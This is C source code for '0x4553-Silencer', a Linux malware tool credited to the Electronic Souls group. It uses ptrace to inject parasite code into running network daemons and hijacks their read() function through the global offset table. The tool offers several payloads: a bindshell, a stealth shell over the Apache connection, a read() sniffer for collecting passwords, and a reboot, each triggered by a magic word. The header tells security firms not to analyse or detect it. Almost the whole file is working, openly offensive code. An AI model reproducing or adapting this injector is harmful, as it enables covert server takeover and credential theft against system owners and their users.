/*
 *                     ______   ________
 *                 ...\\___  \__\  ____/--.....
 *              .::.:/     /   \__________  \:.::.
 *            .::::./     /     /      |/    \.::::.
 *                 /           /       |      \_
 *                 \    ______/  _  _ _________/
 *                 .\___\\  \_________/       .
 *                 .                          .
 *             ..::....[ Electronic Souls ]....::..
 *
 *
 * CONFIDENTIAL SOURCE OF THE ELECTRONICSOULS - DO NOT DISTRIBUTE !! 
 * [ 0 x 4 5 5 3 - S i l e n c e r ] 
 * coded by BrainStorm and Ares !
 * version: Fri Jun  6 12:28:29 EDT 2003 
 * ---------------------------------------------------------------------------------------
 * backd00rs read() on the victim proccess.
 * basicially it overwrites read with our own read() implementation which 
 * acts just like the normal function, but waits silently for a magic packet
 * that contains our backdoor *key*.. if found, it will drop a shell.
 * magic word is "y0wnzz"
 * ---------------------------------------------------------------------------------------
 * usage: 
 * There is backdoors.h with 3 backdoors (for now): 
 *
 *  1 - simple bindshell, tested on ftpd,httpd,fingerd and should work on telnet\imap\pop3
 *      daemons. WARNING!: sshd and sendmail doesn't work!
 *
 *  2 - apache backdoor. it will drop a shell in your current telnet session. 
 *      So it's almost undetectable heh, cause it doesn't use a bindshell which would 
 *      show up in  netstat. To infect other daemons you should know how it works.
 *
 *  3 - read sniffer. will log all data that goes trough read() on the proccess
 *      to a temp file (/tmp/.es.rox) 
 *     
 * If you use the first backdoor, you need to connect to the trojaned service and input the
 * magic word, then nmap the host and check for a new open port. 
 * The second one is much cooler, you just need to enter the magic string and get the shell, 
 * no bindshell or the like, it will drop the shell directly into your terminal.
 * From this version it has a new parameter <method>:
 * 
 * 1 - Use it by default, it will basically overwrite  the ELF headers, so there
 *     are about 244 bytes for our code.
 * 2 - This method use new tekneeq, that allow to allocate so much memory how you need
 *     default there are 1000 bytes. Wanna more ? Edit infect_code() .
 * 3 - Some systems have non executable stack, so the second method won't work.
 *     This implementation will work, ~cause we use another way...
 * ---------------------------------------------------------------------------------------
 * supported systems: for now its Linux/x86 only !
 * tested on kernel 2.4.x with Apache/1.3.26  
 * ---------------------------------------------------------------------------------------
 * special greetz to Sectorx, cuz i learned this tekneeq from delta.tgz thx again bro :) ! 
 * shoutz: ADM,THC,SYNNERGY,PHENOELIT,UNF,TESO,GOBBLEZ,RAZA MEXICANA,old XOR Team members
 *         and all our friends :) you r0ck ! keep the spirit alive.
 * ---------------------------------------------------------------------------------------
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR(S) ``AS IS'' AND ANY EXPRESS OR
 * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
 * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
 *
 * IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
 * INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
 * (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
 * SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 *
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE. IF YOU ARENT A ELECTRONICSOULS MEMBER YOU ARE NOT ALLOWED TO
 * USE AND/OR SAVE THIS CODE IN ANY DIGITAL OR CONVENTIONAL FORM!
 * YOU HAVE TO DELETE IT! USE FOR (NON)COMMERCIAL PURPOSES WITHOUT WRITTEN PERMISSION
 * FROM THE AUTHOR IS FORBIDDEN !
 *
 * FURTHERMORE YOU ARE NOT ALLOWED TO MAKE ANY SIGNATURES OF THE TECHNIC USED/NOR THE CODE !
 * THIS MEANS ESPECIALLY, BUT NOT LIMITED TO, FIRMS LIKE IDEFENSE,ISS,EEYE ETC. ARE NOT
 * ALLOWED TO USE AND/OR ANALYZE THIS CODE OR MAKE PROGRAMS TO DETECT THIS APPLICATION OR TECHNIC!
 * FURTHER IF YOU ARE A MEMBER OF ANY GOVERNMENT AGENCY OR IT-SECURITY COMPANY THEN YOU ARE NOT 
 * ALLOWED TO COMPILE/USE/EDIT/ OR EVEN LOOK AT THIS CODE. YOU HAVE TO DELETE EVERY COPY YOU GOT.
 * 
 * THIS SOFTWARE IS PRIVATE AND THEREFOR YOU DONT HAVE ANY RIGHT TO USE IT. 
 * ...0x4553 a mighty force slippin trough imaginary doors... 
 */

 /* 
  * enough of the words ..let the swords speak:
  */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/ptrace.h>
#include <asm/unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <linux/user.h>
#include <signal.h>
#include <elf.h>          // lub j00 elf.h :>

#include <signal.h>
#include "backdoors.h"

#define OBJDUMP "/usr/bin/objdump"

char *sh_code;
char *inject_parasite_ptr(int bakf)    // pointer
{
  if (bakf==1) {
      asm("
           call me
           me:
           popl %eax
           subl $(me - backdoor1_BEGIN), %eax
          ");
  } else if (bakf==2) {
      asm("
           call ma
           ma:
           popl %eax
           subl $(ma - backdoor2_BEGIN), %eax
          ");
  } else if (bakf==3) {
      asm("
           call mo
           mo:
           popl %eax
           subl $(mo - backdoor3_BEGIN), %eax
          ");
  } else if (bakf==4) {
      asm("
           call mu
           mu:
           popl %eax
           subl $(mu - reboot_BEGIN), %eax
          ");
  }
    
}

int inject_parasite_size(int bakf)
{
    if (bakf==1) {
        asm("movl $(backdoor1_END - backdoor1_BEGIN), %eax");   // get payload size
    } else if (bakf==2) {
        asm("movl $(backdoor2_END - backdoor2_BEGIN), %eax");   
    } else if (bakf==3) {
        asm("movl $(backdoor3_END - backdoor3_BEGIN), %eax");
    } else if (bakf==4) {
        asm("movl $(reboot_END - reboot_BEGIN), %eax");
    }
}

int get_mapbd_len()
{
    asm("movl $(map_END - map), %eax");
}

char *get_mapbd_ptr()
{
      asm("
           call mi
           mi:
           popl %eax
           subl $(mi - map), %eax
          ");
}

int get_textsegment(int pid, int *size)
{
   int i;
   Elf32_Ehdr ehdr;
   char buf[128];

   FILE *input;
   31337;  // sx :>
  
   snprintf(buf,sizeof(buf), "/proc/%d/exe",pid);
   if(!(input=fopen(buf,"rb")))
   return(-1);

   if(fread(&ehdr,sizeof(Elf32_Ehdr),1,input)!=1) goto ewps;    // read ELF binary header + do calculations

   *size=sizeof(Elf32_Ehdr) + ehdr.e_phnum*sizeof(Elf32_Phdr);
   
   if(fseek(input, ehdr.e_phoff, SEEK_SET) != 0)               
   goto ewps;                                     

   for (i=0; i<ehdr.e_phnum; i++){
        Elf32_Phdr phdr;

        if(fread(&phdr,sizeof(Elf32_Phdr),1,input)!=1) 
        goto ewps;

        if (phdr.p_offset == 0){ 
            fclose(input); 
            return phdr.p_vaddr; 
        }
   }
   ewps: ;

   fclose(input);
   return(-1);
}

int inject(int pid, int destaddr, int size, char *data)
{
   int i;
   if(ptrace(PTRACE_ATTACH,pid,0,0) < 0) goto eww;

   fprintf(stderr, "|   ready for injection..\n");
   kill(pid,SIGSTOP);                // send SIGSTOP


   waitpid(pid,NULL,WUNTRACED);      // wait until pid stops
   fprintf(stderr, "|   sent SIGSTOP..\n");

   while(size % 4 != 0) size++;      

   fprintf(stderr, "|   changing registers..\n");
   for (i=0;i<size;i+=4){
        int d;
        memcpy((char*)&d,data+i,4);
        if (ptrace(PTRACE_POKETEXT,pid,destaddr+i,d)<0){   // poke..poke..poke
            ptrace(PTRACE_DETACH,pid,0,0);
            goto eww;
        }
   }

   fprintf(stderr, "|   registers changed.\n");
   ptrace(PTRACE_CONT,pid,0,0);     // continue
   fprintf(stderr, "|   continue proccess..\n");

   ptrace(PTRACE_DETACH,pid,0,0);   // and detach
   fprintf(stderr, "|   detach from pid (%d)\n",pid);

   return(0);

   eww: ;
   return(-1);
}

int got(char *filename, char *function)
{
   FILE *input;

   int bah_1 = strlen(filename),
       bah_2 = strlen(OBJDUMP);

   char data[bah_1+bah_2+10];
   char b00[1024];

   memset(&data,0,sizeof(data));
   sprintf(data, "%s -R %s",OBJDUMP,filename);  // yep..as you know, objdump is our friend :)

   if(!(input=popen(data,"r"))) return(-1);     

   memset(&b00,0,sizeof(b00));

   while (fgets(b00,sizeof(b00),input)){
        char func[256];
        int got;

        sscanf(b00,"%x %s %s",&got,&func,&func);

        if(!strcmp(func,function)){
             pclose(input);
             return(got);              // h0h0h0h got j00 :P
        } memset(&b00,0,sizeof(b00));
     }

   pclose(input);
   return(-1);
}

int infect_ptrace(pid_t pid)
{
    int ptr,i=0,start;
    struct user_regs_struct reg;
    struct user_regs_struct regb;
    ptrace(PTRACE_ATTACH,pid,0,0);
    if(ptrace(PTRACE_ATTACH,pid,0,0) == 1)
        {
          printf("error, couldnt attach to proccess id %d !\n",pid);
      }
							  
  waitpid(pid,NULL,0);
  ptrace(PTRACE_GETREGS,pid,&reg,&reg);
  ptrace(PTRACE_GETREGS,pid,&regb,&regb);
  reg.esp -= 4;
  ptrace(PTRACE_POKETEXT,pid,reg.esp,reg.eip);
  fprintf(stderr," _______________________________________________\n");
  ptr = start = reg.esp - 1024;                    
  reg.eip = (long) start + 2;
  ptrace(PTRACE_SETREGS,pid,&reg,&reg);
  while(i<strlen(sh_code))
  {
    ptrace(PTRACE_POKETEXT,pid,ptr,(int)* (int *) (sh_code+i) ); 
    i += 4; ptr += 4;
  }
  fprintf(stderr,"|   trying to allocate memory \n");
  ptrace(PTRACE_SYSCALL,pid,0,0);
  ptrace(PTRACE_SYSCALL,pid,0,0);
  ptrace(PTRACE_SYSCALL,pid,0,0);
  ptrace(PTRACE_GETREGS,pid,&reg,&reg);
  ptrace(PTRACE_SYSCALL,pid,0,0);
  fprintf(stderr,"| - new memory region mapped to..: 0x%.8lx\n",reg.eax);

  fprintf(stderr,"|   backing registers up...\n");
  ptrace(PTRACE_SETREGS,pid,&regb,&regb);
  fprintf(stderr,"| - dynamical mapping complete! \n",pid);

  ptrace (PTRACE_DETACH,pid,0,0);
  fprintf(stderr,"|_______________________________________________\n");
  return reg.eax;
}

void infect_code()
{
    asm("
    xorl %eax,%eax
    push %eax
    pushl $-1
    push $0x21
    pushl $3
    push $0x55		# mmap() allocate 1000 bytes by default, so if you 
			# need more then calculate new size.
    pushl %eax
    movl %esp,%ebx
    movb $45,%al
    addl $45,%eax
    int $128
    ret
    ");
}

int noexecstack_infect(pid_t pid)
{
    struct user_regs_struct reg,regb;
    ptrace(PTRACE_ATTACH,pid,0,0);
    if(ptrace(PTRACE_ATTACH,pid,0,0) == 1)
    {
       printf("error, couldnt attach to proccess id %d !\n",pid);
    }
							  
    waitpid(pid,NULL,0);
        
    fprintf(stderr," _______________________________________________\n");
    fprintf(stderr,"|   trying to allocate memory...\n");
    fprintf(stderr,"|   now you should call read() in infected process\n");
    fprintf(stderr,"|   awaiting read() syscall.....\n");
    for(;;)
    {
     ptrace(PTRACE_SYSCALL,pid,0,0);
     ptrace(PTRACE_SYSCALL,pid,0,0);
     ptrace(PTRACE_GETREGS,pid,&reg,&reg);
     ptrace(PTRACE_GETREGS,pid,&regb,&regb);
     if (reg.orig_eax==3)
     {
       ptrace(PTRACE_SYSCALL,pid,0,0);
       ptrace(PTRACE_SYSCALL,pid,0,0);
       ptrace(PTRACE_GETREGS,pid,&reg,&reg);

       fprintf(stderr,"| - new memory region mapped to..: 0x%.8lx\n",reg.eax);
       fprintf(stderr,"|   backing registers up...\n");
       ptrace(PTRACE_SETREGS,pid,&regb,&regb);

       fprintf(stderr,"| - dynamical mapping complete! \n",pid);
       ptrace (PTRACE_DETACH,pid,0,0);
       fprintf(stderr,"|_______________________________________________\n");
       return reg.eax;
     }
    }
}

int main(int argc,char *argv[])
{
    int size,textseg,readgot,
        bakf=0,mf=0;
    int ptr,i=0,start;

    pid_t pid;
    char buf[128];

    void infect_code();
    struct user_regs_struct reg,regb;


    if (argc<4){
       fprintf(stderr,"\n\n[ E l e c t r o n i c S o u l s ]\n");
       fprintf(stderr,"[0x4553-Silencer] read() backdoor\n\n");
       fprintf(stderr,"---- by BrainStorm and Ares ----- \n\n");
       fprintf(stderr,"Usage....: %s <num> <method> <pid>\n\n",argv[0]);
       fprintf(stderr,"<num> is:\n");
       fprintf(stderr,"\t [1] - simple bindshell, tested on ftpd,httpd,fingerd and should work on telnet/imap/pop3\n");
       fprintf(stderr,"\t       daemons. WARNING!: sshd and sendmail doesn't work!\n");
       fprintf(stderr,"\t [2] - apache backdoor. will drop a shell into your current telnet\n");
       fprintf(stderr,"\t       session. So it's kinda undetectable, because it doesn't use a bindshell, there is\n");
       fprintf(stderr,"\t       no shit in netstat. To implant it in other daemons you should know how it works.\n");
       fprintf(stderr,"\t [3] - read() sniffer. writes all data to /tmp/.es.rox\n");
       fprintf(stderr,"\t       any data that goes trough read() will be logged..good to collect passwds.\n");
       fprintf(stderr,"\t [4] - system reboot/halt on arrival of the magic string.\n"); 
       fprintf(stderr,"\t -----------------------------------------------------------------------------------------\n");
       fprintf(stderr,"\t Using the first backdoor you should connect to the backdoored service and\n");
       fprintf(stderr,"\t input the magic word, then nmap the host and watch for a new open port.\n");
       fprintf(stderr,"\t The second bd is much cooler, just enter the magic word and get the shell,\n");
       fprintf(stderr,"\t no bindshell...straight into your terminal for your pleasure :)\n\n");
       fprintf(stderr,"<method> is:\n");
       fprintf(stderr,"\t [1] - Overwrite ELF headers. Supports most of the backdoors.\n");
       fprintf(stderr,"\t [2] - Map new memory range. Use for big backdoors, its 1000 bytes by default.\n");
       fprintf(stderr,"\t [3] - Like 2, but for non executable stack. Use in critical situation! May crash whole system.\n");
       fprintf(stderr,"\t --------------------------------------------------------- ES code fu str0ng negr0! ------\n\n");
       exit(0); 
    }


    pid = atoi(argv[3]);

    if((textseg = get_textsegment(pid, &size)) == -1)
    {
      fprintf(stderr, "unable to locate %ds text segment address (%s)\n",pid,strerror(errno));
      return(-1);
    }

    bakf=atoi(argv[1]);
    mf=atoi(argv[2]);	

    if (mf == 2 )
    {
      sh_code = malloc(strlen((char*) infect_code) +4);
      strcpy(sh_code,(char *) infect_code);
      reg.eax = infect_ptrace(pid);
    }

     fprintf(stderr, " _______________________________________________\n");
     fprintf(stderr, "|                                               \n");
     if (bakf==1) {
     fprintf(stderr, "| [ bindshell backdoor selected ]\n"); 
     } else if (bakf==2) {
     fprintf(stderr, "| [ stealth backdoor selected ]\n");
     } else if (bakf==3) {
     fprintf(stderr, "| [ read sniffer selected ]\n");
     }
     fprintf(stderr, "| PID to be infected.............: %d\n",pid);
     if (mf==1) {
       fprintf(stderr, "| Text segment begins at.........: %p\n",textseg);
       fprintf(stderr, "| Available space for parasite...: %d bytes\n",size);
     }
     else if (mf ==2) {
       fprintf(stderr, "| Memory region  begins at.......: %p\n",reg.eax);
       fprintf(stderr, "| Available space for parasite...: 1000 bytes by default\n");
     }

     fprintf(stderr, "| Injection parasite size........: %d bytes\n",inject_parasite_size(bakf));
     fprintf(stderr, "|_______________________________________________\n");

     if (mf == 2){size=1000;}
     if(inject_parasite_size(bakf) > size) {    // validate the size

     fprintf(stderr, "| x your parasite is too fucking fat, send it to weight watchers or optimize it!\n"
                     "| ok trying anyway..it might crash the process, but you should know what you are doing.\n"
                     "| just hope that we dont overwrite anything critical (what we probably gonna do) ...\n");
     }

     fprintf(stderr, "| - size valid.\n");
     snprintf(buf,sizeof(buf),"/proc/%d/exe",pid);

     if((readgot = got(buf,"read")) < 0) {         // grab close()'s GOT addy 
         fprintf(stderr, "| x Unable to extract read()s GOT address\n");
         return(-1);
     }

     fprintf(stderr,"| - read()s GOT address: %p\n",readgot);
     fprintf(stderr,"|   [ PARASITE INJECTION ] \n");

     if (mf == 1)
     {
	
        if(inject(pid,textseg,inject_parasite_size(bakf),inject_parasite_ptr(bakf))<0) 
        {
           fprintf(stderr, "| x Parasite injection failed! (%s)\n",strerror(errno));
           return(-1);
        }
	} else if(mf == 2) {
	
            if(inject(pid,reg.eax,inject_parasite_size(bakf),inject_parasite_ptr(bakf))<0) 
	    {
               fprintf(stderr, "| x Parasite injection failed! (%s)\n",strerror(errno));
               return(-1);
	    }
	    } else {

	    if(inject(pid,textseg,get_mapbd_len(),get_mapbd_ptr())<0) 
	    {
               fprintf(stderr, "| x Parasite injection failed! (%s)\n",strerror(errno));
               return(-1);
	    }
	    
	    if(inject(pid,readgot,4,(char*)&textseg) < 0) 
	    {
               fprintf(stderr, "| x GOT entry injection failed! (%s)\n",strerror(errno));
               return(-1);
	    }

	    reg.eax=noexecstack_infect(pid);
	    
	    if(inject(pid,reg.eax,inject_parasite_size(bakf),inject_parasite_ptr(bakf))<0) 
	    {
               fprintf(stderr, "| x Parasite injection failed! (%s)\n",strerror(errno));
               return(-1);
	    }

	}
	
        fprintf(stderr,"| - trying to infect the proccess..\n");
        fprintf(stderr,"|   [ GOT ENTRY INJECTION ] \n");  
        /* overwrite read()'s global offset table address */
	if (mf == 1) 
	{
	    if(inject(pid,readgot,4,(char*)&textseg) < 0) 
	    {
               fprintf(stderr, "| x GOT entry injection failed! (%s)\n",strerror(errno));
               return(-1);
	    }

	}
	else 
	{
    
    	    if(inject(pid,readgot,4,(char*)&reg.eax) < 0) 
	    {
               fprintf(stderr, "| x GOT entry injection failed! (%s)\n",strerror(errno));
               return(-1);
	    }
        }
        fprintf(stderr, "|   [ PARASITE SUCCESSFULLY INJECTED ! ]\n");
        fprintf(stderr, "|_______________________________________________\n\n");

        exit(0);

}

// if you are interested on how this tekneeq works watch out for our paper.
// or just read the code :P .. code says more than words :D
